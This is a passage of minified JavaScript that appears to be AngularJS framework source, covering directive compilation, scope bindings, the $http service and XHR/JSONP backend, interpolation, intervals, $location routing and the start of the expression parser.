function ga(a,b,d,e,g,h,k,l){var m=[],n,p,K=b[0],r=a.shift(),u=Ub(r,{templateUrl:null,transclude:null,replace:null,$$originalDirective:r}),t=y(r.templateUrl)?r.templateUrl(b,d):r.templateUrl,B=r.templateNamespace;b.empty();f(t).then(function(c){var f,A;c=Ea(c);if(r.replace){c=$b.test(c)?jd(ha(B,S(c))):[];f=c[0];if(1!==c.length||1!==f.nodeType)throw ea("tplrt",r.name,t);c={$attr:{}};la(e,b,f);var I=fc(f,[],c);F(r.scope)&&aa(I,!0);a=I.concat(a);fa(d,c)}else f=K,b.html(c);a.unshift(u);n=X(a,f,d,g,b,
r,h,k,l);q(e,function(a,c){a===f&&(e[c]=b[0])});for(p=Na(b[0].childNodes,g);m.length;){c=m.shift();A=m.shift();var G=m.shift(),J=m.shift(),I=b[0];if(!c.$$destroyed){if(A!==K){var N=A.className;l.hasElementTranscludeDirective&&r.replace||(I=cc(f));la(G,D(A),I);Ma(D(I),N)}A=n.transcludeOnThisElement?ja(c,n.transclude,J):J;n(p,c,I,e,A)}}m=null}).catch(function(a){a instanceof Error&&c(a)}).catch(w);return function(a,b,c,d,e){a=e;b.$$destroyed||(m?m.push(b,c,d,a):(n.transcludeOnThisElement&&(a=ja(b,n.transclude,
e)),n(p,b,c,d,a)))}}function ka(a,b){var c=b.priority-a.priority;return 0!==c?c:a.name!==b.name?a.name<b.name?-1:1:a.index-b.index}function $(a,b,c,d){function e(a){return a?" (module: "+a+")":""}if(b)throw ea("multidir",b.name,e(b.$$moduleName),c.name,e(c.$$moduleName),a,ya(d));}function ma(a,c){var d=b(c,!0);d&&a.push({priority:0,compile:function(a){a=a.parent();var b=!!a.length;b&&ba.$$addBindingClass(a);return function(a,c){var e=c.parent();b||ba.$$addBindingClass(e);ba.$$addBindingInfo(e,d.expressions);
a.$watch(d,function(a){c[0].nodeValue=a})}}})}function ha(a,b){a=P(a||"html");switch(a){case "svg":case "math":var c=z.document.createElement("div");c.innerHTML="<"+a+">"+b+"</"+a+">";return c.childNodes[0].childNodes;default:return b}}function pa(a,b){if("srcdoc"===b)return L.HTML;var c=xa(a);if("src"===b||"ngSrc"===b){if(-1===["img","video","audio","source","track"].indexOf(c))return L.RESOURCE_URL}else if("xlinkHref"===b||"form"===c&&"action"===b||"link"===c&&"href"===b)return L.RESOURCE_URL}function ra(a,
c,d,e,f){var g=pa(a,e),h=k[e]||f,l=b(d,!f,g,h);if(l){if("multiple"===e&&"select"===xa(a))throw ea("selmulti",ya(a));if(m.test(e))throw ea("nodomevents");c.push({priority:100,compile:function(){return{pre:function(a,c,f){c=f.$$observers||(f.$$observers=W());var k=f[e];k!==d&&(l=k&&b(k,!0,g,h),d=k);l&&(f[e]=l(a),(c[e]||(c[e]=[])).$$inter=!0,(f.$$observers&&f.$$observers[e].$$scope||a).$watch(l,function(a,b){"class"===e&&a!==b?f.$updateClass(a,b):f.$set(e,a)}))}}}})}}function la(a,b,c){var d=b[0],e=
b.length,f=d.parentNode,g,h;if(a)for(g=0,h=a.length;g<h;g++)if(a[g]===d){a[g++]=c;h=g+e-1;for(var k=a.length;g<k;g++,h++)h<k?a[g]=a[h]:delete a[g];a.length-=e-1;a.context===d&&(a.context=c);break}f&&f.replaceChild(c,d);a=z.document.createDocumentFragment();for(g=0;g<e;g++)a.appendChild(b[g]);D.hasData(d)&&(D.data(c,D.data(d)),D(d).off("$destroy"));D.cleanData(a.querySelectorAll("*"));for(g=1;g<e;g++)delete b[g];b[0]=c;b.length=1}function sa(a,b){return R(function(){return a.apply(null,arguments)},
a,b)}function ta(a,b,d,e,f,g){try{a(b,d,e,f,g)}catch(h){c(h,ya(d))}}function oa(a,c,d,e,f){function g(b,c,e){!y(d.$onChanges)||c===e||c!==c&&e!==e||(da||(a.$$postDigest(T),da=[]),m||(m={},da.push(h)),m[b]&&(e=m[b].previousValue),m[b]=new Ib(e,c))}function h(){d.$onChanges(m);m=void 0}var k=[],l={},m;q(e,function(e,h){var m=e.attrName,p=e.optional,r,A,u,B;switch(e.mode){case "@":p||va.call(c,m)||(d[h]=c[m]=void 0);p=c.$observe(m,function(a){if(E(a)||Ia(a))g(h,a,d[h]),d[h]=a});c.$$observers[m].$$scope=
a;r=c[m];E(r)?d[h]=b(r)(a):Ia(r)&&(d[h]=r);l[h]=new Ib(hc,d[h]);k.push(p);break;case "=":if(!va.call(c,m)){if(p)break;c[m]=void 0}if(p&&!c[m])break;A=n(c[m]);B=A.literal?qa:function(a,b){return a===b||a!==a&&b!==b};u=A.assign||function(){r=d[h]=A(a);throw ea("nonassign",c[m],m,f.name);};r=d[h]=A(a);p=function(b){B(b,d[h])||(B(b,r)?u(a,b=d[h]):d[h]=b);return r=b};p.$stateful=!0;p=e.collection?a.$watchCollection(c[m],p):a.$watch(n(c[m],p),null,A.literal);k.push(p);break;case "<":if(!va.call(c,m)){if(p)break;
c[m]=void 0}if(p&&!c[m])break;A=n(c[m]);var I=A.literal,G=d[h]=A(a);l[h]=new Ib(hc,d[h]);p=a.$watch(A,function(a,b){if(b===a){if(b===G||I&&qa(b,G))return;b=G}g(h,a,b);d[h]=a},I);k.push(p);break;case "&":A=c.hasOwnProperty(m)?n(c[m]):w;if(A===w&&p)break;d[h]=function(b){return A(a,b)}}});return{initialChanges:l,removeWatches:k.length&&function(){for(var a=0,b=k.length;a<b;++a)k[a]()}}}var Da=/^\w/,ua=z.document.createElement("div"),Fa=O,Ga=u,za=J,da;s.prototype={$normalize:Ca,$addClass:function(a){a&&
0<a.length&&N.addClass(this.$$element,a)},$removeClass:function(a){a&&0<a.length&&N.removeClass(this.$$element,a)},$updateClass:function(a,b){var c=kd(a,b);c&&c.length&&N.addClass(this.$$element,c);(c=kd(b,a))&&c.length&&N.removeClass(this.$$element,c)},$set:function(a,b,d,e){var f=dd(this.$$element[0],a),g=ld[a],h=a;f?(this.$$element.prop(a,b),e=f):g&&(this[g]=b,h=g);this[a]=b;e?this.$attr[a]=e:(e=this.$attr[a])||(this.$attr[a]=e=Nc(a,"-"));f=xa(this.$$element);if("a"===f&&("href"===a||"xlinkHref"===
a)||"img"===f&&"src"===a)this[a]=b=G(b,"src"===a);else if("img"===f&&"srcset"===a&&v(b)){for(var f="",g=S(b),k=/(\s+\d+x\s*,|\s+\d+w\s*,|\s+,|,\s+)/,k=/\s/.test(g)?k:/(,)/,g=g.split(k),k=Math.floor(g.length/2),l=0;l<k;l++)var m=2*l,f=f+G(S(g[m]),!0),f=f+(" "+S(g[m+1]));g=S(g[2*l]).split(/\s/);f+=G(S(g[0]),!0);2===g.length&&(f+=" "+S(g[1]));this[a]=b=f}!1!==d&&(null===b||x(b)?this.$$element.removeAttr(e):Da.test(e)?this.$$element.attr(e,b):Q(this.$$element[0],e,b));(a=this.$$observers)&&q(a[h],function(a){try{a(b)}catch(d){c(d)}})},
$observe:function(a,b){var c=this,d=c.$$observers||(c.$$observers=W()),e=d[a]||(d[a]=[]);e.push(b);B.$evalAsync(function(){e.$$inter||!c.hasOwnProperty(a)||x(c[a])||b(c[a])});return function(){$a(e,b)}}};var Aa=b.startSymbol(),Ba=b.endSymbol(),Ea="{{"===Aa&&"}}"===Ba?Ya:function(a){return a.replace(/\{\{/g,Aa).replace(/}}/g,Ba)},Ha=/^ngAttr[A-Z]/,Ka=/^(.+)Start$/;ba.$$addBindingInfo=p?function(a,b){var c=a.data("$binding")||[];C(b)?c=c.concat(b):c.push(b);a.data("$binding",c)}:w;ba.$$addBindingClass=
p?function(a){Ma(a,"ng-binding")}:w;ba.$$addScopeInfo=p?function(a,b,c,d){a.data(c?d?"$isolateScopeNoTemplate":"$isolateScope":"$scope",b)}:w;ba.$$addScopeClass=p?function(a,b){Ma(a,b?"ng-isolate-scope":"ng-scope")}:w;ba.$$createComment=function(a,b){var c="";p&&(c=" "+(a||"")+": ",b&&(c+=b+" "));return z.document.createComment(c)};return ba}]}function Ib(a,b){this.previousValue=a;this.currentValue=b}function Ca(a){return a.replace(gd,"").replace(mg,gb)}function kd(a,b){var d="",c=a.split(/\s+/),
f=b.split(/\s+/),e=0;a:for(;e<c.length;e++){for(var g=c[e],h=0;h<f.length;h++)if(g===f[h])continue a;d+=(0<d.length?" ":"")+g}return d}function jd(a){a=D(a);var b=a.length;if(1>=b)return a;for(;b--;){var d=a[b];(8===d.nodeType||d.nodeType===Ja&&""===d.nodeValue.trim())&&ng.call(a,b,1)}return a}function lg(a,b){if(b&&E(b))return b;if(E(a)){var d=md.exec(a);if(d)return d[3]}}function rf(){var a={},b=!1;this.has=function(b){return a.hasOwnProperty(b)};this.register=function(b,c){Pa(b,"controller");F(b)?
R(a,b):a[b]=c};this.allowGlobals=function(){b=!0};this.$get=["$injector","$window",function(d,c){function f(a,b,c,d){if(!a||!F(a.$scope))throw M("$controller")("noscp",d,b);a.$scope[b]=c}return function(e,g,h,k){var l,m,n;h=!0===h;k&&E(k)&&(n=k);if(E(e)){k=e.match(md);if(!k)throw nd("ctrlfmt",e);m=k[1];n=n||k[3];e=a.hasOwnProperty(m)?a[m]:Pc(g.$scope,m,!0)||(b?Pc(c,m,!0):void 0);if(!e)throw nd("ctrlreg",m);tb(e,m,!0)}if(h)return h=(C(e)?e[e.length-1]:e).prototype,l=Object.create(h||null),n&&f(g,n,
l,m||e.name),R(function(){var a=d.invoke(e,l,g,m);a!==l&&(F(a)||y(a))&&(l=a,n&&f(g,n,l,m||e.name));return l},{instance:l,identifier:n});l=d.instantiate(e,g,m);n&&f(g,n,l,m||e.name);return l}}]}function sf(){this.$get=["$window",function(a){return D(a.document)}]}function tf(){this.$get=["$document","$rootScope",function(a,b){function d(){f=c.hidden}var c=a[0],f=c&&c.hidden;a.on("visibilitychange",d);b.$on("$destroy",function(){a.off("visibilitychange",d)});return function(){return f}}]}function uf(){this.$get=
["$log",function(a){return function(b,d){a.error.apply(a,arguments)}}]}function ic(a){return F(a)?fa(a)?a.toISOString():cb(a):a}function zf(){this.$get=function(){return function(a){if(!a)return"";var b=[];Ec(a,function(a,c){null===a||x(a)||(C(a)?q(a,function(a){b.push(ka(c)+"="+ka(ic(a)))}):b.push(ka(c)+"="+ka(ic(a))))});return b.join("&")}}}function Af(){this.$get=function(){return function(a){function b(a,f,e){null===a||x(a)||(C(a)?q(a,function(a,c){b(a,f+"["+(F(a)?c:"")+"]")}):F(a)&&!fa(a)?Ec(a,
function(a,c){b(a,f+(e?"":"[")+c+(e?"":"]"))}):d.push(ka(f)+"="+ka(ic(a))))}if(!a)return"";var d=[];b(a,"",!0);return d.join("&")}}}function jc(a,b){if(E(a)){var d=a.replace(og,"").trim();if(d){var c=b("Content-Type");(c=c&&0===c.indexOf(od))||(c=(c=d.match(pg))&&qg[c[0]].test(d));c&&(a=Ic(d))}}return a}function pd(a){var b=W(),d;E(a)?q(a.split("\n"),function(a){d=a.indexOf(":");var f=P(S(a.substr(0,d)));a=S(a.substr(d+1));f&&(b[f]=b[f]?b[f]+", "+a:a)}):F(a)&&q(a,function(a,d){var e=P(d),g=S(a);e&&
(b[e]=b[e]?b[e]+", "+g:g)});return b}function qd(a){var b;return function(d){b||(b=pd(a));return d?(d=b[P(d)],void 0===d&&(d=null),d):b}}function rd(a,b,d,c){if(y(c))return c(a,b,d);q(c,function(c){a=c(a,b,d)});return a}function yf(){var a=this.defaults={transformResponse:[jc],transformRequest:[function(a){return F(a)&&"[object File]"!==na.call(a)&&"[object Blob]"!==na.call(a)&&"[object FormData]"!==na.call(a)?cb(a):a}],headers:{common:{Accept:"application/json, text/plain, */*"},post:ra(kc),put:ra(kc),
patch:ra(kc)},xsrfCookieName:"XSRF-TOKEN",xsrfHeaderName:"X-XSRF-TOKEN",paramSerializer:"$httpParamSerializer",jsonpCallbackParam:"callback"},b=!1;this.useApplyAsync=function(a){return v(a)?(b=!!a,this):b};var d=this.interceptors=[];this.$get=["$browser","$httpBackend","$$cookieReader","$cacheFactory","$rootScope","$q","$injector","$sce",function(c,f,e,g,h,k,l,m){function n(b){function d(a,b){for(var c=0,e=b.length;c<e;){var f=b[c++],g=b[c++];a=a.then(f,g)}b.length=0;return a}function e(a,b){var c,
d={};q(a,function(a,e){y(a)?(c=a(b),null!=c&&(d[e]=c)):d[e]=a});return d}function f(a){var b=R({},a);b.data=rd(a.data,a.headers,a.status,g.transformResponse);a=a.status;return 200<=a&&300>a?b:k.reject(b)}if(!F(b))throw M("$http")("badreq",b);if(!E(m.valueOf(b.url)))throw M("$http")("badreq",b.url);var g=R({method:"get",transformRequest:a.transformRequest,transformResponse:a.transformResponse,paramSerializer:a.paramSerializer,jsonpCallbackParam:a.jsonpCallbackParam},b);g.headers=function(b){var c=
a.headers,d=R({},b.headers),f,g,h,c=R({},c.common,c[P(b.method)]);a:for(f in c){g=P(f);for(h in d)if(P(h)===g)continue a;d[f]=c[f]}return e(d,ra(b))}(b);g.method=vb(g.method);g.paramSerializer=E(g.paramSerializer)?l.get(g.paramSerializer):g.paramSerializer;c.$$incOutstandingRequestCount();var h=[],n=[];b=k.resolve(g);q(u,function(a){(a.request||a.requestError)&&h.unshift(a.request,a.requestError);(a.response||a.responseError)&&n.push(a.response,a.responseError)});b=d(b,h);b=b.then(function(b){var c=
b.headers,d=rd(b.data,qd(c),void 0,b.transformRequest);x(d)&&q(c,function(a,b){"content-type"===P(b)&&delete c[b]});x(b.withCredentials)&&!x(a.withCredentials)&&(b.withCredentials=a.withCredentials);return p(b,d).then(f,f)});b=d(b,n);return b=b.finally(function(){c.$$completeOutstandingRequest(w)})}function p(c,d){function g(a){if(a){var c={};q(a,function(a,d){c[d]=function(c){function d(){a(c)}b?h.$applyAsync(d):h.$$phase?d():h.$apply(d)}});return c}}function l(a,c,d,e){function f(){p(c,a,d,e)}N&&
(200<=a&&300>a?N.put(Q,[a,c,pd(d),e]):N.remove(Q));b?h.$applyAsync(f):(f(),h.$$phase||h.$apply())}function p(a,b,d,e){b=-1<=b?b:0;(200<=b&&300>b?B.resolve:B.reject)({data:a,status:b,headers:qd(d),config:c,statusText:e})}function K(a){p(a.data,a.status,ra(a.headers()),a.statusText)}function u(){var a=n.pendingRequests.indexOf(c);-1!==a&&n.pendingRequests.splice(a,1)}var B=k.defer(),L=B.promise,N,G,T=c.headers,s="jsonp"===P(c.method),Q=c.url;s?Q=m.getTrustedResourceUrl(Q):E(Q)||(Q=m.valueOf(Q));Q=r(Q,
c.paramSerializer(c.params));s&&(Q=J(Q,c.jsonpCallbackParam));n.pendingRequests.push(c);L.then(u,u);!c.cache&&!a.cache||!1===c.cache||"GET"!==c.method&&"JSONP"!==c.method||(N=F(c.cache)?c.cache:F(a.cache)?a.cache:O);N&&(G=N.get(Q),v(G)?G&&y(G.then)?G.then(K,K):C(G)?p(G[1],G[0],ra(G[2]),G[3]):p(G,200,{},"OK"):N.put(Q,L));x(G)&&((G=sd(c.url)?e()[c.xsrfCookieName||a.xsrfCookieName]:void 0)&&(T[c.xsrfHeaderName||a.xsrfHeaderName]=G),f(c.method,Q,d,l,T,c.timeout,c.withCredentials,c.responseType,g(c.eventHandlers),
g(c.uploadEventHandlers)));return L}function r(a,b){0<b.length&&(a+=(-1===a.indexOf("?")?"?":"&")+b);return a}function J(a,b){if(/[&?][^=]+=JSON_CALLBACK/.test(a))throw td("badjsonp",a);if((new RegExp("[&?]"+b+"=")).test(a))throw td("badjsonp",b,a);return a+=(-1===a.indexOf("?")?"?":"&")+b+"=JSON_CALLBACK"}var O=g("$http");a.paramSerializer=E(a.paramSerializer)?l.get(a.paramSerializer):a.paramSerializer;var u=[];q(d,function(a){u.unshift(E(a)?l.get(a):l.invoke(a))});n.pendingRequests=[];(function(a){q(arguments,
function(a){n[a]=function(b,c){return n(R({},c||{},{method:a,url:b}))}})})("get","delete","head","jsonp");(function(a){q(arguments,function(a){n[a]=function(b,c,d){return n(R({},d||{},{method:a,url:b,data:c}))}})})("post","put","patch");n.defaults=a;return n}]}function Cf(){this.$get=function(){return function(){return new z.XMLHttpRequest}}}function Bf(){this.$get=["$browser","$jsonpCallbacks","$document","$xhrFactory",function(a,b,d,c){return rg(a,c,a.defer,b,d[0])}]}function rg(a,b,d,c,f){function e(a,
b,d){a=a.replace("JSON_CALLBACK",b);var e=f.createElement("script"),m=null;e.type="text/javascript";e.src=a;e.async=!0;m=function(a){e.removeEventListener("load",m);e.removeEventListener("error",m);f.body.removeChild(e);e=null;var g=-1,r="unknown";a&&("load"!==a.type||c.wasCalled(b)||(a={type:"error"}),r=a.type,g="error"===a.type?404:200);d&&d(g,r)};e.addEventListener("load",m);e.addEventListener("error",m);f.body.appendChild(e);return m}return function(f,h,k,l,m,n,p,r,J,O){function u(){U&&U();t&&
t.abort()}h=h||a.url();if("jsonp"===P(f))var H=c.createCallback(h),U=e(h,H,function(a,b){var e=200===a&&c.getResponse(H);v(A)&&d.cancel(A);U=t=null;l(a,e,"",b);c.removeCallback(H)});else{var t=b(f,h);t.open(f,h,!0);q(m,function(a,b){v(a)&&t.setRequestHeader(b,a)});t.onload=function(){var a=t.statusText||"",b="response"in t?t.response:t.responseText,c=1223===t.status?204:t.status;0===c&&(c=b?200:"file"===Da(h).protocol?404:0);var e=t.getAllResponseHeaders();v(A)&&d.cancel(A);U=t=null;l(c,b,e,a)};f=
function(){v(A)&&d.cancel(A);U=t=null;l(-1,null,null,"")};t.onerror=f;t.onabort=f;t.ontimeout=f;q(J,function(a,b){t.addEventListener(b,a)});q(O,function(a,b){t.upload.addEventListener(b,a)});p&&(t.withCredentials=!0);if(r)try{t.responseType=r}catch(s){if("json"!==r)throw s;}t.send(x(k)?null:k)}if(0<n)var A=d(u,n);else n&&y(n.then)&&n.then(u)}}function wf(){var a="{{",b="}}";this.startSymbol=function(b){return b?(a=b,this):a};this.endSymbol=function(a){return a?(b=a,this):b};this.$get=["$parse","$exceptionHandler",
"$sce",function(d,c,f){function e(a){return"\\\\\\"+a}function g(c){return c.replace(n,a).replace(p,b)}function h(a,b,c,d){var e=a.$watch(function(a){e();return d(a)},b,c);return e}function k(e,k,n,p){function H(a){try{var b=a;a=n?f.getTrusted(n,b):f.valueOf(b);return p&&!v(a)?a:Yb(a)}catch(d){c(Ea.interr(e,d))}}if(!e.length||-1===e.indexOf(a)){var q;k||(k=g(e),q=ma(k),q.exp=e,q.expressions=[],q.$$watchDelegate=h);return q}p=!!p;var t,s,A=0,K=[],I=[];q=e.length;for(var B=[],L=[];A<q;)if(-1!==(t=e.indexOf(a,
A))&&-1!==(s=e.indexOf(b,t+l)))A!==t&&B.push(g(e.substring(A,t))),A=e.substring(t+l,s),K.push(A),I.push(d(A,H)),A=s+m,L.push(B.length),B.push("");else{A!==q&&B.push(g(e.substring(A)));break}n&&1<B.length&&Ea.throwNoconcat(e);if(!k||K.length){var N=function(a){for(var b=0,c=K.length;b<c;b++){if(p&&x(a[b]))return;B[L[b]]=a[b]}return B.join("")};return R(function(a){var b=0,d=K.length,f=Array(d);try{for(;b<d;b++)f[b]=I[b](a);return N(f)}catch(g){c(Ea.interr(e,g))}},{exp:e,expressions:K,$$watchDelegate:function(a,
b){var c;return a.$watchGroup(I,function(d,e){var f=N(d);y(b)&&b.call(this,f,d!==e?c:f,a);c=f})}})}}var l=a.length,m=b.length,n=new RegExp(a.replace(/./g,e),"g"),p=new RegExp(b.replace(/./g,e),"g");k.startSymbol=function(){return a};k.endSymbol=function(){return b};return k}]}function xf(){this.$get=["$rootScope","$window","$q","$$q","$browser",function(a,b,d,c,f){function e(e,k,l,m){function n(){p?e.apply(null,r):e(u)}var p=4<arguments.length,r=p?wa.call(arguments,4):[],J=b.setInterval,q=b.clearInterval,
u=0,H=v(m)&&!m,U=(H?c:d).defer(),t=U.promise;l=v(l)?l:0;t.$$intervalId=J(function(){H?f.defer(n):a.$evalAsync(n);U.notify(u++);0<l&&u>=l&&(U.resolve(u),q(t.$$intervalId),delete g[t.$$intervalId]);H||a.$apply()},k);g[t.$$intervalId]=U;return t}var g={};e.cancel=function(a){return a&&a.$$intervalId in g?(g[a.$$intervalId].promise.catch(w),g[a.$$intervalId].reject("canceled"),b.clearInterval(a.$$intervalId),delete g[a.$$intervalId],!0):!1};return e}]}function lc(a){a=a.split("/");for(var b=a.length;b--;)a[b]=
db(a[b]);return a.join("/")}function ud(a,b){var d=Da(a);b.$$protocol=d.protocol;b.$$host=d.hostname;b.$$port=Z(d.port)||sg[d.protocol]||null}function vd(a,b){if(tg.test(a))throw lb("badpath",a);var d="/"!==a.charAt(0);d&&(a="/"+a);var c=Da(a);b.$$path=decodeURIComponent(d&&"/"===c.pathname.charAt(0)?c.pathname.substring(1):c.pathname);b.$$search=Lc(c.search);b.$$hash=decodeURIComponent(c.hash);b.$$path&&"/"!==b.$$path.charAt(0)&&(b.$$path="/"+b.$$path)}function mc(a,b){return a.slice(0,b.length)===
b}function sa(a,b){if(mc(b,a))return b.substr(a.length)}function Ba(a){var b=a.indexOf("#");return-1===b?a:a.substr(0,b)}function mb(a){return a.replace(/(#.+)|#$/,"$1")}function nc(a,b,d){this.$$html5=!0;d=d||"";ud(a,this);this.$$parse=function(a){var d=sa(b,a);if(!E(d))throw lb("ipthprfx",a,b);vd(d,this);this.$$path||(this.$$path="/");this.$$compose()};this.$$compose=function(){var a=Xb(this.$$search),d=this.$$hash?"#"+db(this.$$hash):"";this.$$url=lc(this.$$path)+(a?"?"+a:"")+d;this.$$absUrl=b+
this.$$url.substr(1)};this.$$parseLinkUrl=function(c,f){if(f&&"#"===f[0])return this.hash(f.slice(1)),!0;var e,g;v(e=sa(a,c))?(g=e,g=d&&v(e=sa(d,e))?b+(sa("/",e)||e):a+g):v(e=sa(b,c))?g=b+e:b===c+"/"&&(g=b);g&&this.$$parse(g);return!!g}}function oc(a,b,d){ud(a,this);this.$$parse=function(c){var f=sa(a,c)||sa(b,c),e;x(f)||"#"!==f.charAt(0)?this.$$html5?e=f:(e="",x(f)&&(a=c,this.replace())):(e=sa(d,f),x(e)&&(e=f));vd(e,this);c=this.$$path;var f=a,g=/^\/[A-Z]:(\/.*)/;mc(e,f)&&(e=e.replace(f,""));g.exec(e)||
(c=(e=g.exec(c))?e[1]:c);this.$$path=c;this.$$compose()};this.$$compose=function(){var b=Xb(this.$$search),f=this.$$hash?"#"+db(this.$$hash):"";this.$$url=lc(this.$$path)+(b?"?"+b:"")+f;this.$$absUrl=a+(this.$$url?d+this.$$url:"")};this.$$parseLinkUrl=function(b,d){return Ba(a)===Ba(b)?(this.$$parse(b),!0):!1}}function wd(a,b,d){this.$$html5=!0;oc.apply(this,arguments);this.$$parseLinkUrl=function(c,f){if(f&&"#"===f[0])return this.hash(f.slice(1)),!0;var e,g;a===Ba(c)?e=c:(g=sa(b,c))?e=a+d+g:b===
c+"/"&&(e=b);e&&this.$$parse(e);return!!e};this.$$compose=function(){var b=Xb(this.$$search),f=this.$$hash?"#"+db(this.$$hash):"";this.$$url=lc(this.$$path)+(b?"?"+b:"")+f;this.$$absUrl=a+d+this.$$url}}function Jb(a){return function(){return this[a]}}function xd(a,b){return function(d){if(x(d))return this[a];this[a]=b(d);this.$$compose();return this}}function Ef(){var a="!",b={enabled:!1,requireBase:!0,rewriteLinks:!0};this.hashPrefix=function(b){return v(b)?(a=b,this):a};this.html5Mode=function(a){if(Ia(a))return b.enabled=
a,this;if(F(a)){Ia(a.enabled)&&(b.enabled=a.enabled);Ia(a.requireBase)&&(b.requireBase=a.requireBase);if(Ia(a.rewriteLinks)||E(a.rewriteLinks))b.rewriteLinks=a.rewriteLinks;return this}return b};this.$get=["$rootScope","$browser","$sniffer","$rootElement","$window",function(d,c,f,e,g){function h(a,b,d){var e=l.url(),f=l.$$state;try{c.url(a,b,d),l.$$state=c.state()}catch(g){throw l.url(e),l.$$state=f,g;}}function k(a,b){d.$broadcast("$locationChangeSuccess",l.absUrl(),a,l.$$state,b)}var l,m;m=c.baseHref();
var n=c.url(),p;if(b.enabled){if(!m&&b.requireBase)throw lb("nobase");p=n.substring(0,n.indexOf("/",n.indexOf("//")+2))+(m||"/");m=f.history?nc:wd}else p=Ba(n),m=oc;var r=p.substr(0,Ba(p).lastIndexOf("/")+1);l=new m(p,r,"#"+a);l.$$parseLinkUrl(n,n);l.$$state=c.state();var J=/^\s*(javascript|mailto):/i;e.on("click",function(a){var f=b.rewriteLinks;if(f&&!a.ctrlKey&&!a.metaKey&&!a.shiftKey&&2!==a.which&&2!==a.button){for(var h=D(a.target);"a"!==xa(h[0]);)if(h[0]===e[0]||!(h=h.parent())[0])return;if(!E(f)||
!x(h.attr(f))){var f=h.prop("href"),k=h.attr("href")||h.attr("xlink:href");F(f)&&"[object SVGAnimatedString]"===f.toString()&&(f=Da(f.animVal).href);J.test(f)||!f||h.attr("target")||a.isDefaultPrevented()||!l.$$parseLinkUrl(f,k)||(a.preventDefault(),l.absUrl()!==c.url()&&(d.$apply(),g.angular["ff-684208-preventDefault"]=!0))}}});mb(l.absUrl())!==mb(n)&&c.url(l.absUrl(),!0);var q=!0;c.onUrlChange(function(a,b){mc(a,r)?(d.$evalAsync(function(){var c=l.absUrl(),e=l.$$state,f;a=mb(a);l.$$parse(a);l.$$state=
b;f=d.$broadcast("$locationChangeStart",a,c,b,e).defaultPrevented;l.absUrl()===a&&(f?(l.$$parse(c),l.$$state=e,h(c,!1,e)):(q=!1,k(c,e)))}),d.$$phase||d.$digest()):g.location.href=a});d.$watch(function(){var a=mb(c.url()),b=mb(l.absUrl()),e=c.state(),g=l.$$replace,m=a!==b||l.$$html5&&f.history&&e!==l.$$state;if(q||m)q=!1,d.$evalAsync(function(){var b=l.absUrl(),c=d.$broadcast("$locationChangeStart",b,a,l.$$state,e).defaultPrevented;l.absUrl()===b&&(c?(l.$$parse(a),l.$$state=e):(m&&h(b,g,e===l.$$state?
null:l.$$state),k(a,e)))});l.$$replace=!1});return l}]}function Ff(){var a=!0,b=this;this.debugEnabled=function(b){return v(b)?(a=b,this):a};this.$get=["$window",function(d){function c(a){a instanceof Error&&(a.stack?a=a.message&&-1===a.stack.indexOf(a.message)?"Error: "+a.message+"\n"+a.stack:a.stack:a.sourceURL&&(a=a.message+"\n"+a.sourceURL+":"+a.line));return a}function f(a){var b=d.console||{},f=b[a]||b.log||w;a=!1;try{a=!!f.apply}catch(k){}return a?function(){var a=[];q(arguments,function(b){a.push(c(b))});
return f.apply(b,a)}:function(a,b){f(a,null==b?"":b)}}return{log:f("log"),info:f("info"),warn:f("warn"),error:f("error"),debug:function(){var c=f("debug");return function(){a&&c.apply(b,arguments)}}()}}]}function ug(a){return a+""}function vg(a,b){return"undefined"!==typeof a?a:b}function yd(a,b){return"undefined"===typeof a?b:"undefined"===typeof b?a:a+b}function V(a,b){var d,c,f;switch(a.type){case s.Program:d=!0;q(a.body,function(a){V(a.expression,b);d=d&&a.expression.constant});a.constant=d;break;
case s.Literal:a.constant=!0;a.toWatch=[];break;case s.UnaryExpression:V(a.argument,b);a.constant=a.argument.constant;a.toWatch=a.argument.toWatch;break;case s.BinaryExpression:V(a.left,b);V(a.right,b);a.constant=a.left.constant&&a.right.constant;a.toWatch=a.left.toWatch.concat(a.right.toWatch);break;case s.LogicalExpression:V(a.left,b);V(a.right,b);a.constant=a.left.constant&&a.right.constant;a.toWatch=a.constant?[]:[a];break;case s.ConditionalExpression:V(a.test,b);V(a.alternate,b);V(a.consequent,
b);a.constant=a.test.constant&&a.alternate.constant&&a.consequent.constant;a.toWatch=a.constant?[]:[a];break;case s.Identifier:a.constant=!1;a.toWatch=[a];break;case s.MemberExpression:V(a.object,b);a.computed&&V(a.property,b);a.constant=a.object.constant&&(!a.computed||a.property.constant);a.toWatch=[a];break;case s.CallExpression:d=f=a.filter?!b(a.callee.name).$stateful:!1;c=[];q(a.arguments,function(a){V(a,b);d=d&&a.constant;a.constant||c.push.apply(c,a.toWatch)});a.constant=d;a.toWatch=f?c:[a];
break;case s.AssignmentExpression:V(a.left,b);V(a.right,b);a.constant=a.left.constant&&a.right.constant;a.toWatch=[a];break;case s.ArrayExpression:d=!0;c=[];q(a.elements,function(a){V(a,b);d=d&&a.constant;a.constant||c.push.apply(c,a.toWatch)});a.constant=d;a.toWatch=c;break;case s.ObjectExpression:d=!0;c=[];q(a.properties,function(a){V(a.value,b);d=d&&a.value.constant&&!a.computed;a.value.constant||c.push.apply(c,a.value.toWatch)});a.constant=d;a.toWatch=c;break;case s.ThisExpression:a.constant=
!1;a.toWatch=[];break;case s.LocalsExpression:a.constant=!1,a.toWatch=[]}}function zd(a){if(1===a.length){a=a[0].expression;var b=a.toWatch;return 1!==b.length?b:b[0]!==a?b:void 0}}function Ad(a){return a.type===s.Identifier||a.type===s.MemberExpression}function Bd(a){if(1===a.body.length&&Ad(a.body[0].expression))return{type:s.AssignmentExpression,left:a.body[0].expression,right:{type:s.NGValueParameter},operator:"="}}function Cd(a){return 0===a.body.length||1===a.body.length&&(a.body[0].expression.type===
s.Literal||a.body[0].expression.type===s.ArrayExpression||a.body[0].expression.type===s.ObjectExpression)}function Dd(a,b){this.astBuilder=a;this.$filter=b}function Ed(a,b){this.astBuilder=a;this.$filter=b}function pc(a){return y(a.valueOf)?a.valueOf():wg.call(a)}function Gf(){var a=W(),b={"true":!0,"false":!1,"null":null,undefined:void 0},d,c;this.addLiteral=function(a,c){b[a]=c};this.setIdentifierFns=function(a,b){d=a;c=b;return this};this.$get=["$filter",function(f){function e(a,b){return null==
